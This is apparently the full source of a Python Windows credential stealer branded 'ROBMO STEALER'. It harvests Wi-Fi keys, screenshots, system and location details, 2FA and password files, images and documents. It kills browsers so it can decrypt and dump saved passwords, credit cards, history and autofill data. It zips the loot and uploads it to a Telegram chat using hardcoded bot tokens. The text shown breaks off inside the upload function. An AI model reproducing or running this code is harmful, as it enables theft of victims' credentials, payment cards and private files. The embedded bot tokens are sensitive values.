import os, random, datetime, time, sqlite3, logging, shutil, requests
import zipfile, json, psutil, pyzipper, platform, base64, getpass
import pywifi, selenium, telegram, subprocess, xml.etree.ElementTree as ET
import sounddevice as sd, numpy as np, ctypes
import winreg as reg, threading, asyncio

from scipy.io import wavfile
from PIL import ImageGrab
from urllib.request import urlopen, Request
from json import loads as json_loads, load
from datetime import datetime
from json import loads
from pathlib import Path
from Crypto.Cipher import AES
from getpass import getuser
from telegram import Bot
from telegram import InputFile
from win32crypt import CryptUnprotectData
from datetime import datetime, timedelta

ma = {
    'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆', 'H': '𝐇', 'I': '𝐈', 'J': '𝐉', 'K': '𝐊', 
    'L': '𝐋', 'M': '𝐌', 'N': '𝐍', 'Ñ': '𝐍̃', 'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓', 'U': '𝐔', 
    'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙',
}

mi = {
    'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝', 'e': '𝐞', 'f': '𝐟', 'g': '𝐠', 'h': '𝐡', 'i': '𝐢', 'j': '𝐣',
    'k': '𝐤', 'l': '𝐥', 'm': '𝐦', 'n': '𝐧', 'ñ': '𝐧̃','o': '𝐨', 'p': '𝐩', 'q': '𝐪', 'r': '𝐫', 's': '𝐬',
    't': '𝐭', 'u': '𝐮', 'v': '𝐯', 'w': '𝐰', 'x': '𝐱','y': '𝐲', 'z': '𝐳',
}


num = {
    '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒', '5': '𝟓',
    '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗', '0': '𝟎',
}

i = '''
╔═══════════════════════════════════════════════╗

   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
   
╚═══════════════════════════════════════════════╝
'''

r = '''
═════════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════════
'''

user = os.path.expanduser("~")

username = os.getenv("USERNAME")

u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")

arrow = " ➤ "

s = "\n"

USERTLG = 123456
ID = -1001933102780  
BOT1 = "6650505242:AAG5p1dKgEtWRG8uLOjOnzmbg8i6CD0NLoU"
BOT2 = "5653063371:AAFr_yg-viVlckax0Lik-Mnx1RBvY0LYdJw"
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

def enable_show_hidden_files():
    try:
        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
        key_name = "Hidden"

        with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_path, 0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, key_name, 0, reg.REG_DWORD, 1)

    except Exception as e:
        pass
    
enable_show_hidden_files()

def screenshot(interval, num_s, o_folder):
    s_folder = os.path.join(o_folder, "𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭𝐬")
    if not os.path.exists(s_folder):
        os.makedirs(s_folder)
    for i in range(num_s):
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("[%d][%M][%S]")
        filename = f"𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭{timestamp}.png"
        screenshot_path = os.path.join(s_folder, filename)
        screenshot.save(screenshot_path)
        time.sleep(interval)
        
screenshot(interval=1, num_s=3, o_folder=u_folder)

def convertir_nombre(name):
    result1 = ''
    for letter in name:
        if letter in ma:
            result1 += ma[letter]
        elif letter in mi:
            result1 += mi[letter]
        elif letter in num:
            result1 += num[letter]
        else:
            result1 += letter
    return result1

def w_folder(u_folder):
    w_folder = os.path.join(u_folder, "𝐖𝐢-𝐟𝐢")
    if not os.path.exists(w_folder):
        os.makedirs(w_folder)
    return w_folder

def export_w(w_folder):
    try:
        o_file = os.path.join(w_folder, "output.txt")
        with open(o_file, "w") as output:
            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", "folder=" + w_folder], stdout=output, stderr=output, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

w_folder = w_folder(u_folder)
result = export_w(w_folder)

if result:
    os.remove(os.path.join(w_folder, "output.txt"))
    
w_path = r'C:\Users\{user}\𝐔𝐬𝐞𝐫\𝐖𝐢-𝐟𝐢'.format(user=os.getlogin())
if not os.path.exists(w_path):
    exit()

for filename in os.listdir(w_path):
    if filename.endswith(".xml"):
        file_path = os.path.join(w_path, filename)
        tree = ET.parse(file_path)
        root = tree.getroot()
        profile_name = "N/A"
        authentication = "N/A"
        key_type = "N/A"
        key_material = "N/A"
        for elem in root.iter():
            if "name" in elem.tag:
                profile_name = elem.text if elem.text else "N/A"
            elif "authentication" in elem.tag:
                authentication = elem.text if elem.text else "N/A"
            elif "keyType" in elem.tag:
                key_type = elem.text if elem.text else "N/A"
            elif "keyMaterial" in elem.tag:
                key_material = elem.text if elem.text else "N/A"    
        converted_name = convertir_nombre(profile_name)
        o_filename = os.path.splitext(filename)[0] + ".txt"
        output_path = os.path.join(w_path, converted_name + ".txt")
        if not os.path.exists(output_path):
            os.rename(file_path, output_path)
            with open(output_path, 'w', encoding="utf-8") as o_file:
                o_file.write(i)
                o_file.write(s)
                o_file.write(r)
                o_file.write(s)
                o_file.write(f"➤  𝐍𝐚𝐦𝐞: {profile_name}\n")
                o_file.write(r)
                o_file.write(s)
                o_file.write(f"➤  𝐀𝐮𝐭𝐡𝐞𝐧𝐭𝐢𝐜𝐚𝐭𝐢𝐨𝐧: {authentication}\n")
                o_file.write(r)
                o_file.write(s)
                o_file.write(f"➤  𝐊𝐞𝐲𝐓𝐲𝐩𝐞: {key_type}\n")
                o_file.write(r)
                o_file.write(s)
                o_file.write(f"➤  𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: {key_material}\n")
                o_file.write(r)
                o_file.write(s)

def delete(folder_p):
    for filename in os.listdir(folder_p):
        if filename.endswith(".xml"):
            file_path = os.path.join(folder_p, filename)
            os.remove(file_path)

delete(w_folder)

def systeminfo():
    computer_name = os.getenv('COMPUTERNAME')
    os_version = platform.system() + " " + platform.release()
    total_memory_gb = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    cpu_info = platform.processor()
    system_type = platform.architecture()[0]
    system_info = f"➤ 𝐂𝐨𝐦𝐩𝐮𝐭𝐞𝐫 𝐍𝐚𝐦𝐞: {computer_name}\n➤ 𝐎𝐒: {os_version}\n➤ 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐨𝐫𝐲: {total_memory_gb} 𝐆𝐁\n➤ 𝐂𝐏𝐔: {cpu_info}\n➤ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐓𝐲𝐩𝐞: {system_type}"
    return system_info

def guardar():
    
    user = os.getlogin()
    user_folder = os.path.join(f"C:\\Users\\{user}", "𝐔𝐬𝐞𝐫")
    pc_info_folder = os.path.join(user_folder, "𝐏𝐜 𝐈𝐧𝐟𝐨")  
    if not os.path.exists(pc_info_folder):
        os.makedirs(pc_info_folder)
    file_path = os.path.join(pc_info_folder, "𝐒𝐲𝐬𝐭𝐞𝐦 𝐈𝐧𝐟𝐨.txt") 
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(i.strip() + s + s + systeminfo())
        
guardar()

def netuser():
    result = subprocess.run(['net', 'user'], capture_output=True, text=True, check=True)
    return result.stdout.strip().splitlines()[:-1]

def save(content, file_p):
    with open(file_p, 'w', encoding='utf-8') as file:
        file.write(i)
        file.write(s)
        file.write(content)
        
nt = netuser()
folder_path = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫", "𝐏𝐜 𝐈𝐧𝐟𝐨")
if not os.path.exists(folder_path):
    os.makedirs(folder_path)
file_p = os.path.join(folder_path, "𝐔𝐬𝐞𝐫𝐬.txt")

save("\n".join(nt), file_p)

def getip():
    ip = "None"
    try:
        ip = urlopen("https://api.ipify.org", timeout=10).read().decode().strip()
    except Exception as e:
        pass
    return ip

def info():
    ip = getip()
    city, region, country, timezone, org, loc = "None", "None", "None", "None", "None", "None"
    try:
        ipjson = urlopen("https://ipinfo.io/json", timeout=10).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipjson)
        city = ipdata["city"]
        region = ipdata["region"]
        country = ipdata["country"]
        timezone = ipdata["timezone"]
        org = ipdata["org"]
        loc = ipdata["loc"]
    except Exception as e:
        pass
    
    now = datetime.now()
    date = now.strftime("%d-%m-%y")
    time = now.strftime("%H:%M:%S") 
    info = f"\n➤  𝐔𝐬𝐞𝐫: {username}\n➤  𝐈𝐏: {ip}\n➤  𝐂𝐢𝐭𝐲: {city}\n➤  𝐑𝐞𝐠𝐢𝐨𝐧: {region}\n➤  𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n➤  𝐓𝐢𝐦𝐞𝐳𝐨𝐧𝐞: {timezone}\n➤  𝐎𝐫𝐠: {org}\n➤  𝐋𝐨𝐜: {loc}\n➤  𝐃𝐚𝐭𝐞: {date}\n➤  𝐓𝐢𝐦𝐞: {time}"
    
    return info

def ginfo():
    user_info = info()
    zz = "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨:"
    if not os.path.exists(u_folder):
        os.makedirs(u_folder)
    file_path = os.path.join(u_folder, "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨.txt")
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(i.strip() + s + s + zz + s + user_info)

ginfo()

def filesf(folders, names, extension=".txt"):
    found_files = []

    for folder in folders:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if any(name.lower() in file.lower() for name in names) and file.lower().endswith(extension):
                    file_path = os.path.join(root, file)
                    found_files.append((file, file_path))
                    
    return found_files

def copy_files_to_destination(files, destination_folder):
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    for file, source_path in files:
        destination_path = os.path.join(destination_folder, file)
        shutil.copy2(source_path, destination_path)

folders_to_search = [
    os.path.join(user, "Downloads"), 
    os.path.join(user, "OneDrive", "Documents"),
    os.path.join(user, "Documents"), 
    os.path.join(user, "OneDrive", "Documentos"),
    os.path.join(user, "Documentos"), 
    os.path.join(user, "OneDrive", "Escritorio"),
    os.path.join(user, "OneDrive", "Deskstop"),
    os.path.join(user, "Deskstop"),
    os.path.join(user, "Escritorio"),
]

file_search = {"2fa", "backup", "two", "factor", "codes", "code", "passwords"}

found_files = filesf(folders_to_search, file_search)
if found_files:
    destination_folder = os.path.join(u_folder, "𝐅𝐢𝐥𝐞𝐬", "𝟐𝐅𝐀")
    copy_files_to_destination(found_files, destination_folder)
else:
    pass

folders_to_search = [
    os.path.join(user, "Downloads"), 
    os.path.join(user, "OneDrive", "Documents"),
    os.path.join(user, "Documents"), 
    os.path.join(user, "OneDrive", "Documentos"),
    os.path.join(user, "Documentos"), 
    os.path.join(user, "OneDrive", "Escritorio"),
    os.path.join(user, "OneDrive", "Deskstop"),
    os.path.join(user, "Deskstop"),
    os.path.join(user, "Escritorio"),
    os.path.join(user, "Downloads")
]

u_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
destination = os.path.join(u_folder, "𝐅𝐢𝐥𝐞𝐬", "𝐏𝐢𝐜𝐭𝐮𝐫𝐞𝐬")

Path(destination).mkdir(parents=True, exist_ok=True)

txt_file_path = os.path.join(destination, "𝐅𝐢𝐥𝐞𝐬.txt")

with open(txt_file_path, "w", encoding='utf-8') as txt_file:
    txt_file.write(f"{i}\n\n")

    for folder in folders_to_search:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                    source_path = os.path.join(root, file)
                    destination_path = os.path.join(destination, file)
                    
                    shutil.copy2(source_path, destination_path)
                    
                    txt_file.write(f"𝐅𝐢𝐥𝐞: {file}\n")
                    txt_file.write(f"𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧: {source_path}\n")
                    txt_file.write(f"{r}")
                    txt_file.write("\n")

folders_to_search = [
    os.path.join(user, "Downloads"), 
    os.path.join(user, "OneDrive", "Documents"),
    os.path.join(user, "Documents"), 
    os.path.join(user, "OneDrive", "Documentos"),
    os.path.join(user, "Documentos"), 
    os.path.join(user, "OneDrive", "Escritorio"),
    os.path.join(user, "OneDrive", "Deskstop"),
    os.path.join(user, "Deskstop"),
    os.path.join(user, "Escritorio"),
    os.path.join(user, "Downloads")
]

destination = os.path.join(u_folder, "𝐅𝐢𝐥𝐞𝐬", "𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭𝐬")

Path(destination).mkdir(parents=True, exist_ok=True)

txt_file_path = os.path.join(destination, "𝐅𝐢𝐥𝐞𝐬.txt")

with open(txt_file_path, "w", encoding='utf-8') as txt_file:
    txt_file.write(f"{i}\n\n")

    for folder in folders_to_search:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if file.lower().endswith(('.docx', '.xlsx', '.pptx', '.pdf', '.csv')):
                    source_path = os.path.join(root, file)
                    destination_path = os.path.join(destination, file)
                    
                    shutil.copy2(source_path, destination_path)
                    
                    txt_file.write(f"➤  𝐅𝐢𝐥𝐞: {file}\n")
                    txt_file.write(f"➤  𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧: {source_path}\n")
                    txt_file.write(f"{r}")
                    txt_file.write("\n")

def cerrar_navegadores():
    navegadores = ["chrome", "firefox", "msedge", "iexplore", "opera", "operagx"]

    try:
        for navegador in navegadores:
            for proceso in psutil.process_iter(['pid', 'name']):
                if proceso.info['name'] and navegador.lower() in proceso.info['name'].lower():
                    pid = proceso.info['pid']
                    proceso = psutil.Process(pid)
                    proceso.terminate()
    except Exception as e:
        pass

def bloquear_navegadores(tiempo_bloqueo=10):
    tiempo_inicial = time.time()

    while time.time() - tiempo_inicial < tiempo_bloqueo:
        cerrar_navegadores()
        time.sleep(2)  

bloquear_navegadores()
 
def browser_txt(user_folder, browser_list):
    browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")
    if not os.path.exists(browser):
        os.makedirs(browser)
    browser_txt = os.path.join(browser, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬.txt")
    installed_browsers = [
        f"➤ 𝐍𝐚𝐦𝐞: {name} {s}➤ 𝐏𝐚𝐭𝐡: {path} {s}{r}" for name, path in browser_list.items() if os.path.exists(path)
    ]
    if installed_browsers:
        with open(browser_txt, "w", encoding="utf-8") as file:
            file.write(i)
            file.write(s)
            file.write("𝐈𝐧𝐬𝐭𝐚𝐥𝐥𝐞𝐝 𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬:" + s + s)
            file.write(s.join(installed_browsers))   

browsers = {
    '𝐀𝐯𝐚𝐬𝐭': local + '\\AVAST\\Software Browser\\User Data',  
    '𝐂𝐡𝐫𝐨𝐦𝐞': local + '\\Google\\Chrome\\User Data',
    '𝐄𝐝𝐠𝐞': local + '\\Microsoft\\Edge\\User Data',
    '𝐁𝐫𝐚𝐯𝐞': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    '𝐎𝐩𝐞𝐫𝐚': roaming + '\\Opera Software\\Opera Stable',
    '𝐓𝐨𝐫𝐜𝐡': local + '\\Torch\\User Data',
    '𝐊𝐨𝐦𝐞𝐭𝐚': local + '\\Kometa\\User Data',
    '𝐎𝐫𝐛𝐢𝐭𝐮𝐦': local + '\\Orbitum\\User Data',
    '𝐂𝐞𝐧𝐭𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\CentBrowser\\User Data',
    '𝐒𝐩𝐮𝐭𝐧𝐢𝐤': local + '\\Sputnik\\Sputnik\\User Data',
    '𝐅𝐢𝐫𝐞𝐟𝐨𝐱': roaming + '\\Mozilla\\Firefox\\Profiles\\',
    '𝐕𝐢𝐯𝐚𝐥𝐝𝐢': local + '\\Vivaldi\\User Data',
    '𝐆𝐨𝐨𝐠𝐥𝐞-𝐂𝐡𝐫𝐨𝐦𝐞-𝐒𝐱𝐒': local + '\\Google\\Chrome SxS\\User Data', 
    '𝐄𝐩𝐢𝐜-𝐏𝐫𝐢𝐯𝐚𝐜𝐲-𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\Epic Privacy Browser',
    '𝐔𝐫𝐚𝐧': local + '\\uCozMedia\\Uran\\User Data',
    '𝐘𝐚𝐧𝐝𝐞𝐱': local + '\\Yandex\\YandexBrowser\\User Data',
    '𝐈𝐫𝐢𝐝𝐢𝐮𝐦': local + '\\Iridium\\User Data',
    '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': roaming + '\\Opera Software\\Opera GX Stable',
}

browser_txt(u_folder, browsers)

data_queries = {
    '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬': {
        'query': 'SELECT origin_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['𝐔𝐑𝐋', '𝐔𝐬𝐞𝐫', '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝'],
        'decrypt': True
    },
    '𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝𝐬': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['𝐍𝐚𝐦𝐞 𝐎𝐧 𝐂𝐚𝐫𝐝', '𝐌𝐨𝐧𝐭𝐡', '𝐘𝐞𝐚𝐫', '𝐂𝐚𝐫𝐝 𝐍𝐮𝐦𝐛𝐞𝐫'],
        'decrypt': True
    },
    '𝐇𝐢𝐬𝐭𝐨𝐫𝐲': {
        'query': 'SELECT url, title FROM urls',
        'file': '\\History',
        'columns': ['𝐔𝐑𝐋', '𝐓𝐢𝐭𝐥𝐞'],
        'decrypt': False
    },
    '𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬 𝐔𝐑𝐋', '𝐋𝐨𝐜𝐚𝐥 𝐏𝐚𝐭𝐡'],
        'decrypt': False
    },
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

bloquear_navegadores()

def save_results(browser_name, type_of_data, content):
    user = os.path.expanduser("~")
    user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫")
    browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", browser_name)
    if not os.path.exists(browser):
        os.makedirs(browser, exist_ok=True)
    
    if content is not None:
        file_path = os.path.join(browser, f"{type_of_data}.txt")
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(i.strip() + "\n\n" + content)

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

bloquear_navegadores()

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

available_browsers = installed_browsers()

for browser in available_browsers:
    browser_path = browsers[browser]
    master_key = get_master_key(browser_path)

    for data_type_name, data_type in data_queries.items():
        data = get_data(browser_path, "Default", master_key, data_type)
        save_results(browser, data_type_name, data)


chrome = {
    '𝐂𝐡𝐫𝐨𝐦𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
}

output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐂𝐡𝐫𝐨𝐦𝐞")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(output_folder)

def get_autofill_data(browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
                f.write(i + s + r + s + s)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browser_path in chrome.items():
    get_autofill_data(browser_path)
    
bloquear_navegadores()

opera = {
    '𝐎𝐩𝐞𝐫𝐚': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
}

output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐎𝐩𝐞𝐫𝐚")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(output_folder)

def get_autofill_data(browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
                f.write(i + s + r + s + s)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browser_path in opera.items():
    get_autofill_data(browser_path)
    
bloquear_navegadores()

edge = {
    '𝐄𝐝𝐠𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
}

outputfolder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐄𝐝𝐠𝐞")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(outputfolder)

def get_auto_data(browserpath):
    try:
        web_data_db = os.path.join(browserpath, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(outputfolder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
                f.write(i + s + r + s + s)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browserpath in edge.items():
    get_auto_data(browserpath)

operagx = {
    '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
}

output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(output_folder)

def get_autofilldata(browser_name, browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{r}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
                f.write(i + s + r + s + s)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browser_path in operagx.items():
    get_autofilldata(browser_name, browser_path)
    

def gkey(path: str):
    if not os.path.exists(path):
        return None

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    encrypted_key = encrypted_key[5:]

    try:
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        pass

def decrypt_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def get_saved_passwords(browser_profile_path, master_key):
    login_data = os.path.join(browser_profile_path, 'Login Data')
    shutil.copy2(login_data, "LoginData.db")  

    conn = sqlite3.connect("LoginData.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = cursor.fetchall()

    decrypted_passwords = []
    for data in login_data:
        url, username, password = data
        password = decrypt_password(password, master_key)
        decrypted_passwords.append((url, username, password))

    conn.close()
    os.remove("LoginData.db")

    return decrypted_passwords

def save_passwords_to_file(passwords, output_path, i):
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(i + s + r + s + "\n")
        for url, username, password in passwords:
            f.write(f"𝐔𝐑𝐋: {url}\n")
            f.write(f"𝐔𝐬𝐞𝐫: {username}\n")
            f.write(f"𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: {password}")
            f.write("\n\n═════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════" + "\n\n")

def operagxx():
    user = os.path.expanduser("~")
    
    profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable")
    
    opera_folder = os.path.join(user, "𝐔𝐬𝐞𝐫\\𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬\\𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")
    if not os.path.exists(opera_folder):
        os.makedirs(opera_folder, exist_ok=True)
    
    master_key = gkey(profile_path)

    if master_key:
        saved_passwords = get_saved_passwords(profile_path, master_key)
        if saved_passwords:
            output_path = os.path.join(opera_folder, "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt")  
            save_passwords_to_file(saved_passwords, output_path, i)
            
operagxx()  

def create_zip(u_folder):
    user = getuser()

    now = datetime.now()
    zip_filename = f"𝑅𝑂𝐵𝑀𝑂[{now.day:02d}][{user}][{now.minute:02d}][{now.second:02d}].zip"

    zip_filepath = os.path.join("C:\\Users", user, "Downloads", zip_filename)

    try:
        shutil.make_archive(zip_filepath[:-4], 'zip', u_folder)
        return zip_filepath
    except Exception as e:
        pass
        return None

async def send_zip_to_telegram(zip_filepath, bot_token, chat_id):
    bot = Bot(token=bot_token)

    try:
        user_name = getuser()  
        user_message = f"𝐔𝐬𝐞𝐫: {user_name}"
        await bot.send_message(chat_id=chat_id, text=user_message)

        with open(zip_filepath, 'rb') as zip_file:
            await bot.send_document(chat_id=chat_id, document=InputFile(zip_file))

        separator_message = "═════════════════"
        await bot.send_message(chat_id=chat_id, text=separator_message)

